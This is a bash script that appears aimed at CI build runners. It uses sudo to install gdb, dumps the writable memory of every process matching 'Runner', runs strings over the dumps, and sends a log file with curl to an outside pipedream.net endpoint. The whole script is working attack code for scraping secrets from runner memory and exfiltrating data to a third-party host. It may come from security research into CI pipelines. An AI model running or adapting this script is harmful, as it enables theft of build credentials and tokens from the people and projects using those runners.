#!/bin/bash

# install gdb sudo is passwordless according to doc
sudo apt-get install gdb > /tmp/file.txt

mkdir dumps
echo "STARTING..." >> /tmp/file.txt
#ps -ef | grep http.server  | tr -s ' ' | cut -d ' ' -f2 >> /tmp/file.txt

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo $pid >> /tmp/file.txt
    grep rw-p /proc/$pid/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
        strings dumps/*; \
        rm dumps/$pid-$start-$stop.dump; \
    done
done

echo "FINISHED..." >> /tmp/file.txt
grep rw-p /proc/$pid/maps
rm -rf dumps/

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
